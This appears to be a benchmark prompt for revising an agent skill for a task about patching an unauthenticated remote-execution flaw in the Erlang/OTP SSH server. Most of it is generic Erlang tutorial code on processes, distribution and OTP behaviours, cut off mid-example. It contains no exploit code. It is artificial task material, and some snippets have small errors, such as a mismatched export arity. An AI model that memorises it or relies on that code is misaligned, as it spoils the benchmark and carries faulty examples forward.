[Common wrapper]
You are revising a Task skill, not directly solving the task.
Use the provided Meta schema as class-level guidance.
Your goal is to improve the Task skill for this task while preserving useful existing structure.

[Meta schema block]
Category: artifact-generation
Semantic intent: Produce a constrained artifact that must exactly satisfy an output contract.
Emphasize:
- exact output schema / format / placement requirements
- preservation constraints and no-invention discipline
- missing-input detection before finalization
- short final reviewer pass against explicit contract items
Avoid:
- unnecessary multi-stage scaffolding
- speculative filling of unknown fields
- tool usage that is not required by the artifact contract
Expected good fit:
- form filling
- formatting / conversion with strict output expectations
- single-artifact generation or transformation
Expected bad fit:
- benchmark-gated code repair
- control/simulation loops
- deep retrieval-heavy synthesis
Hypothesized primary failure modes:
- unavailable in prompt-bank-v0.1; use task-local evidence instead
Meta schema seed guidance:
You are revising a skill for an artifact-generation task.
Optimize the skill for exactness of the final artifact, not breadth of procedure.

Prioritize:
1. explicit statement of the required output artifact and allowed transformations,
2. no-invention / do-not-guess rules for missing or ambiguous inputs,
3. preservation of formatting, structure, or source truth where required,
4. a short final verification checklist before producing the final artifact.

Keep the skill lean.
Only introduce stages, tools, or wrappers when they are clearly necessary for meeting the artifact contract.

Do not turn the skill into a generic multi-stage workflow if the task is fundamentally a constrained artifact-writing problem.

[Task context block]
Task name: fix-erlang-ssh-cve
Task summary: Erlang/OTP SSH is the built-in SSH server component of the Erlang/OTP platform. A critical vulnerability was discovered in the Erlang/OTP SSH server, allowing attackers to execute arbitrary system commands remotely without authentication by crafting specific SSH protocol messages. In `/app/workspace/otp_src_27.3.2` we provide the source code of an affected version of Erlang/OTP SSH server.
Task constraints:
- seed schema prior: engineering-composition
- verifier mode: benchmark-threshold
- workflow topology: staged-multi-step
- tool surface regime: tool-heavy-script-recommended
- primary pattern: reviewer
- annotation confidence: high
- secondary patterns: pipeline, tool-wrapper
Task output requirements:
- verifier note: benchmark-threshold
- current skill count: 6

[Current Task skill block]
Current Task skill:
## erlang-concurrency
---
name: erlang-concurrency
description: Use when erlang's concurrency model including lightweight processes, message passing, process links and monitors, error handling patterns, selective receive, and building massively concurrent systems on the BEAM VM.
---

# Erlang Concurrency

## Introduction

Erlang's concurrency model based on lightweight processes and message passing
enables building massively scalable systems. Processes are isolated with no shared
memory, communicating asynchronously through messages. This model eliminates
concurrency bugs common in shared-memory systems.

The BEAM VM efficiently schedules millions of processes, each with its own heap
and mailbox. Process creation is fast and cheap, enabling "process per entity"
designs. Links and monitors provide failure detection, while selective receive
enables flexible message handling patterns.

This skill covers process creation and spawning, message passing patterns,
process links and monitors, selective receive, error propagation, concurrent
design patterns, and building scalable concurrent systems.

## Process Creation and Spawning

Create lightweight processes for concurrent task execution.

```erlang
%% Basic process spawning
simple_spawn() ->
    Pid = spawn(fun() ->
        io:format("Hello from process ~p~n", [self()])
    end),
    Pid.

%% Spawn with arguments
spawn_with_args(Message) ->
    spawn(fun() ->
        io:format("Message: ~p~n", [Message])
    end).

%% Spawn and register
spawn_registered() ->
    Pid = spawn(fun() -> loop() end),
    register(my_process, Pid),
    Pid.

loop() ->
    receive
        stop -> ok;
        Msg ->
            io:format("Received: ~p~n", [Msg]),
            loop()
    end.

%% Spawn link (linked processes)
spawn_linked() ->
    spawn_link(fun() ->
        timer:sleep(1000),
        io:format("Linked process done~n")
    end).

%% Spawn monitor
spawn_monitored() ->
    {Pid, Ref} = spawn_monitor(fun() ->
        timer:sleep(500),
        exit(normal)
    end),
    {Pid, Ref}.

%% Process pools
create_pool(N) ->
    [spawn(fun() -> worker_loop() end) || _ <- lists:seq(1, N)].

worker_loop() ->
    receive
        {work, Data, From} ->
            Result = process_data(Data),
            From ! {result, Result},
            worker_loop();
        stop ->
            ok
    end.

process_data(Data) -> Data * 2.

%% Parallel map
pmap(F, List) ->
    Parent = self(),
    Pids = [spawn(fun() ->
        Parent ! {self(), F(X)}
    end) || X <- List],
    [receive {Pid, Result} -> Result end || Pid <- Pids].


%% Fork-join pattern
fork_join(Tasks) ->
    Self = self(),
    Pids = [spawn(fun() ->
        Result = Task(),
        Self ! {self(), Result}
    end) || Task <- Tasks],
    [receive {Pid, Result} -> Result end || Pid <- Pids].
```

Lightweight processes enable massive concurrency with minimal overhead.

## Message Passing Patterns

Processes communicate through asynchronous message passing without shared memory.

```erlang
%% Send and receive
send_message() ->
    Pid = spawn(fun() ->
        receive
            {From, Msg} ->
                io:format("Received: ~p~n", [Msg]),
                From ! {reply, "Acknowledged"}
        end
    end),
    Pid ! {self(), "Hello"},
    receive
        {reply, Response} ->
            io:format("Response: ~p~n", [Response])
    after 5000 ->
        io:format("Timeout~n")
    end.

%% Request-response pattern
request(Pid, Request) ->
    Ref = make_ref(),
    Pid ! {self(), Ref, Request},
    receive
        {Ref, Response} -> {ok, Response}
    after 5000 ->
        {error, timeout}
    end.

server_loop() ->
    receive
        {From, Ref, {add, A, B}} ->
            From ! {Ref, A + B},
            server_loop();
        {From, Ref, {multiply, A, B}} ->
            From ! {Ref, A * B},
            server_loop();
        stop -> ok
    end.

%% Publish-subscribe
start_pubsub() ->
    spawn(fun() -> pubsub_loop([]) end).

pubsub_loop(Subscribers) ->
    receive
        {subscribe, Pid} ->
            pubsub_loop([Pid | Subscribers]);
        {unsubscribe, Pid} ->
            pubsub_loop(lists:delete(Pid, Subscribers));
        {publish, Message} ->
            [Pid ! {message, Message} || Pid <- Subscribers],
            pubsub_loop(Subscribers)
    end.

%% Pipeline pattern
pipeline(Data, Functions) ->
    lists:foldl(fun(F, Acc) -> F(Acc) end, Data, Functions).

concurrent_pipeline(Data, Stages) ->
    Self = self(),
    lists:foldl(fun(Stage, AccData) ->
        Pid = spawn(fun() ->
            Result = Stage(AccData),
            Self ! {result, Result}
        end),
        receive {result, R} -> R end
    end, Data, Stages).
```

Message passing enables safe concurrent communication without locks.

## Links and Monitors

Links bidirectionally connect processes while monitors provide one-way observation.

```erlang
%% Process linking
link_example() ->
    process_flag(trap_exit, true),
    Pid = spawn_link(fun() ->
        timer:sleep(1000),
        exit(normal)
    end),
    receive
        {'EXIT', Pid, Reason} ->
            io:format("Process exited: ~p~n", [Reason])
    end.

%% Monitoring
monitor_example() ->
    Pid = spawn(fun() ->
        timer:sleep(500),
        exit(normal)
    end),
    Ref = monitor(process, Pid),
    receive
        {'DOWN', Ref, process, Pid, Reason} ->
            io:format("Process down: ~p~n", [Reason])
    end.

%% Supervisor pattern
supervisor() ->
    process_flag(trap_exit, true),
    Worker = spawn_link(fun() -> worker() end),
    supervisor_loop(Worker).

supervisor_loop(Worker) ->
    receive
        {'EXIT', Worker, _Reason} ->
            NewWorker = spawn_link(fun() -> worker() end),
            supervisor_loop(NewWorker)
    end.

worker() ->
    receive
        crash -> exit(crashed);
        work -> worker()
    end.
```

Links and monitors enable building fault-tolerant systems with automatic
failure detection.

## Best Practices

1. **Create processes liberally** as they are lightweight and cheap to spawn

2. **Use message passing exclusively** for inter-process communication
   without shared state

3. **Implement proper timeouts** on receives to prevent indefinite blocking

4. **Use monitors for one-way observation** when bidirectional linking unnecessary

5. **Keep process state minimal** to reduce memory usage per process

6. **Use registered names sparingly** as global names limit scalability

7. **Implement proper error handling** with links and monitors for fault tolerance

8. **Use selective receive** to handle specific messages while leaving others queued

9. **Avoid message accumulation** by handling all message patterns in receive clauses

10. **Profile concurrent systems** to identify bottlenecks and optimize hot paths

## Common Pitfalls

1. **Creating too few processes** underutilizes Erlang's concurrency model

2. **Not using timeouts** in receive causes indefinite blocking on failure

3. **Accumulating messages** in mailboxes causes memory leaks and performance degradation

4. **Using shared ETS tables** as mutex replacement defeats isolation benefits

5. **Not handling all message types** causes mailbox overflow with unmatched messages

6. **Forgetting to trap exits** in supervisors prevents proper error handling

7. **Creating circular links** causes cascading failures without proper supervision

8. **Using processes for fine-grained parallelism** adds overhead without benefits

9. **Not monitoring spawned processes** loses track of failures

10. **Overusing registered names** creates single points of failure and contention

## When to Use This Skill

Apply processes for concurrent tasks requiring isolation and independent state.

Use message passing for all inter-process communication in distributed systems.

Leverage links and monitors to build fault-tolerant supervision hierarchies.

Create process pools for concurrent request handling and parallel computation.

Use selective receive for complex message handling protocols.

## Resources

- [Erlang Concurrency Tutorial](<https://www.erlang.org/doc/getting_started/conc_prog.html>)
- [Learn You Some Erlang - Concurrency](<https://learnyousomeerlang.com/the-hitchhikers-guide-to-concurrency>)
- [Erlang Process Manual](<https://www.erlang.org/doc/reference_manual/processes.html>)
- [Designing for Scalability with Erlang/OTP](<https://www.oreilly.com/library/view/designing-for-scalability/9781449361556/>)
- [Programming Erlang](<https://pragprog.com/titles/jaerlang2/programming-erlang-2nd-edition/>)

## erlang-distribution
---
name: erlang-distribution
description: Use when erlang distributed systems including node connectivity, distributed processes, global name registration, distributed supervision, network partitions, and building fault-tolerant multi-node applications on the BEAM VM.
---

# Erlang Distribution

## Introduction

Erlang's built-in distribution enables building clustered, fault-tolerant systems
across multiple nodes. Processes on different nodes communicate transparently
through the same message-passing primitives used locally. This location transparency
makes distributed programming natural and straightforward.

The distribution layer handles network communication, serialization, and node
connectivity automatically. Nodes discover each other through naming, with processes
addressable globally via registered names or pid references. Understanding distribution
patterns is essential for building scalable, resilient systems.

This skill covers node connectivity and clustering, distributed message passing,
global name registration, distributed supervision, handling network partitions,
RPC patterns, and building production distributed applications.

## Node Connectivity

Nodes connect to form clusters for distributed computation and fault tolerance.

```erlang
%% Starting named nodes
%% erl -name node1@hostname -setcookie secret
%% erl -sname node2 -setcookie secret

%% Connecting nodes
connect_nodes() ->
    Node1 = 'node1@host',
    Node2 = 'node2@host',
    net_kernel:connect_node(Node2).

%% Check connected nodes
list_nodes() ->
    Nodes = [node() | nodes()],
    io:format("Connected nodes: ~p~n", [Nodes]).

%% Monitor node connections
monitor_nodes() ->
    net_kernel:monitor_nodes(true),
    receive
        {nodeup, Node} ->
            io:format("Node up: ~p~n", [Node]);
        {nodedown, Node} ->
            io:format("Node down: ~p~n", [Node])
    end.

%% Node configuration
start_distributed() ->
    {ok, _} = net_kernel:start([mynode, shortnames]),
    erlang:set_cookie(node(), secret_cookie).

%% Hidden nodes (for monitoring)
connect_hidden(Node) ->
    net_kernel:connect_node(Node),
    erlang:disconnect_node(Node),
    net_kernel:hidden_connect_node(Node).

%% Get node information
node_info() ->
    #{
        name => node(),
        cookie => erlang:get_cookie(),
        nodes => nodes(),
        alive => is_alive()
    }.
```

Node connectivity enables building distributed clusters with automatic discovery.

## Distributed Message Passing

Send messages to processes on remote nodes using same syntax as local messaging.

```erlang
%% Send to registered process on remote node
send_remote(Node, Name, Message) ->
    {Name, Node} ! Message.

%% Spawn process on remote node
spawn_on_remote(Node, Fun) ->
    spawn(Node, Fun).

spawn_on_remote(Node, Module, Function, Args) ->
    spawn(Node, Module, Function, Args).

%% Distributed request-response
remote_call(Node, Module, Function, Args) ->
    Pid = spawn(Node, fun() ->
        Result = apply(Module, Function, Args),
        receive
            {From, Ref} -> From ! {Ref, Result}
        end
    end),
    Ref = make_ref(),
    Pid ! {self(), Ref},
    receive
        {Ref, Result} -> {ok, Result}
    after 5000 ->
        {error, timeout}
    end.

%% Distributed work distribution
-module(work_dispatcher).
-export([start/0, dispatch/1]).

start() ->
    register(?MODULE, spawn(fun() -> loop([]) end)).

dispatch(Work) ->
    ?MODULE ! {dispatch, Work}.

loop(Workers) ->
    receive
        {dispatch, Work} ->
            Node = select_node(nodes()),
            Pid = spawn(Node, fun() -> do_work(Work) end),
            loop([{Pid, Node} | Workers])
    end.

select_node(Nodes) ->
    lists:nth(rand:uniform(length(Nodes)), Nodes).

do_work(Work) ->
    Result = process_work(Work),
    io:format("Work done on ~p: ~p~n", [node(), Result]).

process_work(Work) -> Work * 2.

%% Remote group leader for output
remote_process_with_io(Node) ->
    spawn(Node, fun() ->
        group_leader(self(), self()),
        io:format("Output from ~p~n", [node()])
    end).
```

Location-transparent messaging enables seamless distributed communication.

## Global Name Registration

Register process names globally across distributed clusters.

```erlang
%% Global registration
register_global(Name) ->
    Pid = spawn(fun() -> global_loop() end),
    global:register_name(Name, Pid),
    Pid.

global_loop() ->
    receive
        {From, Message} ->
            From ! {reply, Message},
            global_loop();
        stop -> ok
    end.

%% Send to globally registered process
send_global(Name, Message) ->
    case global:whereis_name(Name) of
        undefined ->
            {error, not_found};
        Pid ->
            Pid ! Message,
            ok
    end.

%% Global name with conflict resolution
register_with_resolve(Name) ->
    Pid = spawn(fun() -> server_loop() end),
    ResolveFun = fun(Name, Pid1, Pid2) ->
        %% Keep process on node with lower name
        case node(Pid1) < node(Pid2) of
            true -> Pid1;
            false -> Pid2
        end
    end,
    global:register_name(Name, Pid, ResolveFun).

server_loop() ->
    receive
        Message ->
            io:format("Received: ~p on ~p~n", [Message, node()]),
            server_loop()
    end.

%% Global synchronization
sync_global() ->
    global:sync().

%% List globally registered names
list_global_names() ->
    global:registered_names().

%% Re-register after node reconnection
ensure_global_registration(Name, Fun) ->
    case global:whereis_name(Name) of
        undefined ->
            Pid = spawn(Fun),
            global:register_name(Name, Pid),
            Pid;
        Pid ->
            Pid
    end.
```

Global registration enables location-independent process discovery.

## Distributed Supervision

Supervise processes across multiple nodes for cluster-wide fault tolerance.

```erlang
-module(distributed_supervisor).
-behaviour(supervisor).

-export([start_link/0, start_worker/1]).
-export([init/1]).

start_link() ->
    supervisor:start_link({local, ?MODULE}, ?MODULE, []).

start_worker(Node) ->
    ChildSpec = #{
        id => make_ref(),
        start => {worker, start_link, [Node]},
        restart => permanent,
        type => worker
    },
    supervisor:start_child(?MODULE, ChildSpec).

init([]) ->
    SupFlags = #{
        strategy => one_for_one,
        intensity => 5,
        period => 60
    },
    {ok, {SupFlags, []}}.

%% Worker module spawning on specific node
-module(worker).
-export([start_link/1, loop/0]).

start_link(Node) ->
    Pid = spawn_link(Node, ?MODULE, loop, []),
    {ok, Pid}.

loop() ->
    receive
        stop -> ok;
        Msg ->
            io:format("Worker on ~p: ~p~n", [node(), Msg]),
            loop()
    end.

%% Distributed process groups
-module(pg_example).
-export([start/0, join/1, broadcast/1]).

start() ->
    pg:start_link().

join(Group) ->
    pg:join(Group, self()).

broadcast(Group, Message) ->
    Members = pg:get_members(Group),
    [Pid ! Message || Pid <- Members].
```

Distributed supervision maintains system health across node failures.

## RPC and Remote Execution

Execute function calls on remote nodes with various invocation patterns.

```erlang
%% Basic RPC
simple_rpc(Node, Module, Function, Args) ->
    rpc:call(Node, Module, Function, Args).

%% RPC with timeout
timed_rpc(Node, Module, Function, Args, Timeout) ->
    rpc:call(Node, Module, Function, Args, Timeout).

%% Async RPC
async_rpc(Node, Module, Function, Args) ->
    Key = rpc:async_call(Node, Module, Function, Args),
    %% Later retrieve result
    rpc:yield(Key).

%% Parallel RPC to multiple nodes
parallel_rpc(Nodes, Module, Function, Args) ->
    rpc:multicall(Nodes, Module, Function, Args).

%% Parallel call with results
parallel_rpc_results(Nodes, Module, Function, Args) ->
    rpc:multicall(Nodes, Module, Function, Args, 5000).

%% Cast (fire and forget)
cast_rpc(Node, Module, Function, Args) ->
    rpc:cast(Node, Module, Function, Args).

%% Broadcast to all nodes
broadcast_rpc(Module, Function, Args) ->
    Nodes = [node() | nodes()],
    rpc:multicall(Nodes, Module, Function, Args).

%% Parallel map over nodes
pmap_nodes(Fun, List) ->
    Nodes = nodes(),
    DistFun = fun(X) ->
        Node = lists:nth((X rem length(Nodes)) + 1, Nodes),
        rpc:call(Node, erlang, apply, [Fun, [X]])
    end,
    lists:map(DistFun, List).
```

RPC enables convenient remote execution with location transparency.

## Network Partitions and CAP

Handle network partitions and understand CAP theorem trade-offs.

```erlang
%% Detect network partition
detect_partition() ->
    ExpectedNodes = [node1@host, node2@host, node3@host],
    CurrentNodes = nodes(),
    Missing = ExpectedNodes -- CurrentNodes,
    case Missing of
        [] -> ok;
        Nodes -> {partition, Nodes}
    end.

%% Partition healing strategy
-module(partition_handler).
-export([monitor_cluster/1]).

monitor_cluster(ExpectedNodes) ->
    net_kernel:monitor_nodes(true),
    monitor_loop(ExpectedNodes, nodes()).

monitor_loop(Expected, Current) ->
    receive
        {nodeup, Node} ->
            NewCurrent = [Node | Current],
            case length(NewCurrent) == length(Expected) of
                true ->
                    io:format("Cluster fully connected~n"),
                    heal_partition();
                false ->
                    ok
            end,
            monitor_loop(Expected, NewCurrent);

        {nodedown, Node} ->
            NewCurrent = lists:delete(Node, Current),
            io:format("Partition detected: ~p~n", [Node]),
            monitor_loop(Expected, NewCurrent)
    end.

heal_partition() ->
    %% Synchronize state after partition heals
    global:sync(),
    ok.

%% Consensus with majority
-module(consensus).
-export([propose/2, vote/3]).

propose(Nodes, Value) ->
    Ref = make_ref(),
    [Node ! {vote, self(), Ref, Value} || Node <- Nodes],
    collect_votes(Ref, length(Nodes), 0).

collect_votes(_Ref, Total, Votes) when Votes > Total div 2 ->
    {ok, majority};
collect_votes(_Ref, Total, Total) ->
    {error, no_majority};
collect_votes(Ref, Total, Votes) ->
    receive
        {vote, Ref, accept} ->
            collect_votes(Ref, Total, Votes + 1);
        {vote, Ref, reject} ->
            collect_votes(Ref, Total, Votes)
    after 5000 ->
        {error, timeout}
    end.

vote(From, Ref, Value) ->
    Decision = evaluate_proposal(Value),
    From ! {vote, Ref, Decision}.

evaluate_proposal(_Value) -> accept.
```

Partition handling strategies maintain system availability during network failures.

## Best Practices

1. **Use short names for local clusters** and long names for internet-wide distribution

2. **Set same cookie** on all nodes in trusted cluster for security

3. **Monitor node connections** to detect and handle network partitions

4. **Use global registration sparingly** as it adds coordination overhead

5. **Implement partition detection** and healing strategies for resilience

6. **Design for eventual consistency** in distributed systems accepting CAP limitations

7. **Use RPC for simple calls** but prefer message passing for complex protocols

8. **Test with network failures** using tools like toxiproxy or chaos engineering

9. **Implement proper timeouts** on distributed calls to handle slow networks

10. **Use distributed supervision** to maintain fault tolerance across nodes

## Common Pitfalls

1. **Not setting cookies** prevents nodes from connecting causing silent failures

2. **Using global registry everywhere** creates single point of failure and bottleneck

3. **Not handling node disconnection** causes processes to hang indefinitely

4. **Assuming network reliability** leads to incorrect behavior during partitions

5. **Using long timeouts** in RPC calls causes cascading delays during failures

6. **Not testing network partitions** misses critical failure modes

7. **Forgetting to synchronize** global registry after partition heals

8. **Using same node name** on multiple machines causes conflicts

9. **Not monitoring node health** prevents detecting degraded cluster state

10. **Relying on strict consistency** in distributed setting violates CAP theorem

## When to Use This Skill

Apply distribution when building systems requiring high availability and fault tolerance.

Use distributed supervision for critical services needing automatic failover.

Leverage multiple nodes for horizontal scalability beyond single machine limits.

Implement distributed systems when geographic distribution provides latency benefits.

Use clustering for load distribution across multiple servers.

Apply distribution patterns for building resilient microservices architectures.

## Resources

- [Erlang Distribution Protocol](<https://www.erlang.org/doc/apps/erts/erl_dist_protocol.html>)
- [Distributed Erlang](<https://www.erlang.org/doc/reference_manual/distributed.html>)
- [Learn You Some Erlang - Distributed OTP](<https://learnyousomeerlang.com/distributed-otp-applications>)
- [Designing Distributed Systems](<https://www.oreilly.com/library/view/designing-distributed-systems/9781491983638/>)
- [CAP Theorem Explained](<https://www.infoq.com/articles/cap-twelve-years-later-how-the-rules-have-changed/>)

## erlang-otp-behaviors
---
name: erlang-otp-behaviors
description: Use when oTP behaviors including gen_server for stateful processes, gen_statem for state machines, supervisors for fault tolerance, gen_event for event handling, and building robust, production-ready Erlang applications with proven patterns.
---

# Erlang OTP Behaviors

## Introduction

OTP (Open Telecom Platform) behaviors provide reusable patterns for common process
types in Erlang systems. These abstractions handle complex details like message
passing, error handling, and state management, allowing developers to focus on
business logic while maintaining system reliability.

Behaviors define interfaces that processes must implement, with OTP handling the
infrastructure. Gen_server provides client-server processes, gen_statem implements
state machines, supervisors manage process lifecycles, and gen_event coordinates
event distribution. Understanding these patterns is essential for production Erlang.

This skill covers gen_server for stateful processes, gen_statem for complex state
machines, supervisor trees for fault tolerance, gen_event for event handling,
application behavior for packaging, and patterns for building robust OTP systems.

## Gen_Server Basics

Gen_server implements client-server processes with synchronous and asynchronous
communication.

```erlang
-module(counter_server).
-behaviour(gen_server).

%% API
-export([start_link/0, increment/0, decrement/0, get_value/0, reset/0]).

%% gen_server callbacks
-export([init/1, handle_call/3, handle_cast/2, handle_info/2, terminate/2, code_change/3]).

-define(SERVER, ?MODULE).

%% State record
-record(state, {count = 0}).

%%%===================================================================
%%% API
%%%===================================================================

start_link() ->
    gen_server:start_link({local, ?SERVER}, ?MODULE, [], []).

increment() ->
    gen_server:cast(?SERVER, increment).

decrement() ->
    gen_server:cast(?SERVER, decrement).

get_value() ->
    gen_server:call(?SERVER, get_value).

reset() ->
    gen_server:call(?SERVER, reset).

%%%===================================================================
%%% gen_server callbacks
%%%===================================================================

init([]) ->
    {ok, #state{}}.

%% Synchronous calls (with response)
handle_call(get_value, _From, State) ->
    {reply, State#state.count, State};

handle_call(reset, _From, State) ->
    {reply, ok, State#state{count = 0}};

handle_call(_Request, _From, State) ->
    {reply, ignored, State}.

%% Asynchronous casts (no response)
handle_cast(increment, State) ->
    NewCount = State#state.count + 1,
    {noreply, State#state{count = NewCount}};

handle_cast(decrement, State) ->
    NewCount = State#state.count - 1,
    {noreply, State#state{count = NewCount}};

handle_cast(_Msg, State) ->
    {noreply, State}.

%% Handle other messages
handle_info(_Info, State) ->
    {noreply, State}.

terminate(_Reason, _State) ->
    ok.

code_change(_OldVsn, State, _Extra) ->
    {ok, State}.

%%%===================================================================
%%% Complex gen_server example: Cache
%%%===================================================================

-module(cache_server).
-behaviour(gen_server).

-export([start_link/1, put/2, get/1, delete/1, clear/0, size/0]).
-export([init/1, handle_call/3, handle_cast/2, handle_info/2, terminate/2, code_change/3]).

-record(state, {
    cache = #{},
    max_size = 1000,
    hits = 0,
    misses = 0
}).

start_link(MaxSize) ->
    gen_server:start_link({local, ?MODULE}, ?MODULE, [MaxSize], []).

put(Key, Value) ->
    gen_server:call(?MODULE, {put, Key, Value}).

get(Key) ->
    gen_server:call(?MODULE, {get, Key}).

delete(Key) ->
    gen_server:cast(?MODULE, {delete, Key}).

clear() ->
    gen_server:cast(?MODULE, clear).

size() ->
    gen_server:call(?MODULE, size).

init([MaxSize]) ->
    process_flag(trap_exit, true),
    {ok, #state{max_size = MaxSize}}.

handle_call({put, Key, Value}, _From, State) ->
    Cache = State#state.cache,
    case maps:size(Cache) >= State#state.max_size of
        true ->
            {reply, {error, cache_full}, State};
        false ->
            NewCache = maps:put(Key, Value, Cache),
            {reply, ok, State#state{cache = NewCache}}
    end;

handle_call({get, Key}, _From, State) ->
    Cache = State#state.cache,
    case maps:find(Key, Cache) of
        {ok, Value} ->
            NewState = State#state{hits = State#state.hits + 1},
            {reply, {ok, Value}, NewState};
        error ->
            NewState = State#state{misses = State#state.misses + 1},
            {reply, not_found, NewState}
    end;

handle_call(size, _From, State) ->
    Size = maps:size(State#state.cache),
    {reply, Size, State};

handle_call(_Request, _From, State) ->
    {reply, {error, unknown_request}, State}.

handle_cast({delete, Key}, State) ->
    NewCache = maps:remove(Key, State#state.cache),
    {noreply, State#state{cache = NewCache}};

handle_cast(clear, State) ->
    {noreply, State#state{cache = #{}}};

handle_cast(_Msg, State) ->
    {noreply, State}.

handle_info(_Info, State) ->
    {noreply, State}.

terminate(Reason, State) ->
    io:format("Cache terminating: ~p~n", [Reason]),
    io:format("Stats - Hits: ~p, Misses: ~p~n", [State#state.hits, State#state.misses]),
    ok.

code_change(_OldVsn, State, _Extra) ->
    {ok, State}.

%%%===================================================================
%%% gen_server with timeouts
%%%===================================================================

-module(session_server).
-behaviour(gen_server).

-export([start_link/0, touch/0]).
-export([init/1, handle_call/3, handle_cast/2, handle_info/2, terminate/2, code_change/3]).

-define(TIMEOUT, 30000). % 30 seconds

-record(state, {
    last_activity,
    data = #{}
}).

start_link() ->
    gen_server:start_link({local, ?MODULE}, ?MODULE, [], []).

touch() ->
    gen_server:cast(?MODULE, touch).

init([]) ->
    {ok, #state{last_activity = erlang:system_time(millisecond)}, ?TIMEOUT}.

handle_call(_Request, _From, State) ->
    {reply, ok, State, ?TIMEOUT}.

handle_cast(touch, State) ->
    NewState = State#state{last_activity = erlang:system_time(millisecond)},
    {noreply, NewState, ?TIMEOUT};

handle_cast(_Msg, State) ->
    {noreply, State, ?TIMEOUT}.

handle_info(timeout, State) ->
    io:format("Session timed out~n"),
    {stop, normal, State};

handle_info(_Info, State) ->
    {noreply, State, ?TIMEOUT}.

terminate(_Reason, _State) ->
    ok.

code_change(_OldVsn, State, _Extra) ->
    {ok, State}.
```

Gen_server provides structure for stateful processes with client-server patterns.

## Gen_Statem for State Machines

Gen_statem implements finite state machines with explicit state transitions.

```erlang
-module(door_fsm).
-behaviour(gen_statem).

-export([start_link/0, open/0, close/0, lock/0, unlock/1]).
-export([init/1, callback_mode/0, terminate/3, code_change/4]).
-export([locked/3, unlocked/3, open/3]).

-define(CODE, "1234").

start_link() ->
    gen_statem:start_link({local, ?MODULE}, ?MODULE, [], []).

open() ->
    gen_statem:call(?MODULE, open).

close() ->
    gen_statem:call(?MODULE, close).

lock() ->
    gen_statem:call(?MODULE, lock).

unlock(Code) ->
    gen_statem:call(?MODULE, {unlock, Code}).

init([]) ->
    {ok, locked, #{}}.

callback_mode() ->
    state_functions.

%% Locked state
locked(call, {unlock, Code}, Data) when Code =:= ?CODE ->
    {next_state, unlocked, Data, [{reply, ok}]};

locked(call, {unlock, _WrongCode}, Data) ->
    {keep_state, Data, [{reply, {error, wrong_code}}]};

locked(call, _Event, Data) ->
    {keep_state, Data, [{reply, {error, door_locked}}]}.

%% Unlocked state
unlocked(call, lock, Data) ->
    {next_state, locked, Data, [{reply, ok}]};

unlocked(call, open, Data) ->
    {next_state, open, Data, [{reply, ok}]};

unlocked(call, _Event, Data) ->
    {keep_state, Data, [{reply, ok}]}.

%% Open state
open(call, close, Data) ->
    {next_state, unlocked, Data, [{reply, ok}]};

open(call, _Event, Data) ->
    {keep_state, Data, [{reply, {error, door_open}}]}.

terminate(_Reason, _State, _Data) ->
    ok.

code_change(_OldVsn, State, Data, _Extra) ->
    {ok, State, Data}.

%%%===================================================================
%%% Connection state machine
%%%===================================================================

-module(connection_fsm).
-behaviour(gen_statem).

-export([start_link/0, connect/0, disconnect/0, send/1]).
-export([init/1, callback_mode/0, terminate/3, code_change/4]).
-export([disconnected/3, connecting/3, connected/3]).

-record(data, {
    socket = undefined,
    buffer = <<>>,
    retry_count = 0
}).

start_link() ->
    gen_statem:start_link({local, ?MODULE}, ?MODULE, [], []).

connect() ->
    gen_statem:call(?MODULE, connect).

disconnect() ->
    gen_statem:call(?MODULE, disconnect).

send(Data) ->
    gen_statem:call(?MODULE, {send, Data}).

init([]) ->
    {ok, disconnected, #data{}}.

callback_mode() ->
    [state_functions, state_enter].

%% Disconnected state
disconnected(enter, _OldState, _Data) ->
    io:format("Entered disconnected state~n"),
    keep_state_and_data;

disconnected(call, connect, Data) ->
    case connect_to_server() of
        {ok, Socket} ->
            {next_state, connected, Data#data{socket = Socket, retry_count = 0},
             [{reply, ok}]};
        error ->
            NewData = Data#data{retry_count = Data#data.retry_count + 1},
            case NewData#data.retry_count < 3 of
                true ->
                    {next_state, connecting, NewData, [{reply, {error, retrying}}]};
                false ->
                    {keep_state, NewData, [{reply, {error, max_retries}}]}
            end
    end.

%% Connecting state
connecting(enter, _OldState, _Data) ->
    erlang:send_after(1000, self(), retry_connect),
    keep_state_and_data;

connecting(info, retry_connect, Data) ->
    case connect_to_server() of
        {ok, Socket} ->
            {next_state, connected, Data#data{socket = Socket, retry_count = 0}};
        error ->
            NewData = Data#data{retry_count = Data#data.retry_count + 1},
            case NewData#data.retry_count < 3 of
                true ->
                    {keep_state, NewData};
                false ->
                    {next_state, disconnected, NewData}
            end
    end.

%% Connected state
connected(enter, _OldState, _Data) ->
    io:format("Connection established~n"),
    keep_state_and_data;

connected(call, {send, Data}, StateData) ->
    case send_data(StateData#data.socket, Data) of
        ok ->
            {keep_state_and_data, [{reply, ok}]};
        error ->
            {next_state, disconnected, StateData, [{reply, {error, send_failed}}]}
    end;

connected(call, disconnect, StateData) ->
    close_connection(StateData#data.socket),
    {next_state, disconnected, StateData#data{socket = undefined}, [{reply, ok}]}.

terminate(_Reason, _State, Data) ->
    case Data#data.socket of
        undefined -> ok;
        Socket -> close_connection(Socket)
    end.

code_change(_OldVsn, State, Data, _Extra) ->
    {ok, State, Data}.

%% Helper functions
connect_to_server() ->
    {ok, socket}.

send_data(_Socket, _Data) ->
    ok.

close_connection(_Socket) ->
    ok.
```

Gen_statem provides structured state machine implementation with explicit
transitions.

## Supervisor Trees

Supervisors monitor child processes and restart them on failure for fault
tolerance.

```erlang
-module(my_supervisor).
-behaviour(supervisor).

-export([start_link/0]).
-export([init/1]).

start_link() ->
    supervisor:start_link({local, ?MODULE}, ?MODULE, []).

init([]) ->
    SupFlags = #{
        strategy => one_for_one,
        intensity => 5,
        period => 60
    },

    ChildSpecs = [
        #{
            id => counter_server,
            start => {counter_server, start_link, []},
            restart => permanent,
            shutdown => 5000,
            type => worker,
            modules => [counter_server]
        },
        #{
            id => cache_server,
            start => {cache_server, start_link, [1000]},
            restart => permanent,
            shutdown => 5000,
            type => worker,
            modules => [cache_server]
        }
    ],

    {ok, {SupFlags, ChildSpecs}}.

%%%===================================================================
%%% Supervisor strategies
%%%===================================================================

%% one_for_one: Restart only failed child
init_one_for_one([]) ->
    SupFlags = #{strategy => one_for_one},
    Children = [worker_spec(worker1), worker_spec(worker2)],
    {ok, {SupFlags, Children}}.

%% one_for_all: Restart all children if any fails
init_one_for_all([]) ->
    SupFlags = #{strategy => one_for_all},
    Children = [worker_spec(worker1), worker_spec(worker2)],
    {ok, {SupFlags, Children}}.

%% rest_for_one: Restart failed child and all started after it
init_rest_for_one([]) ->
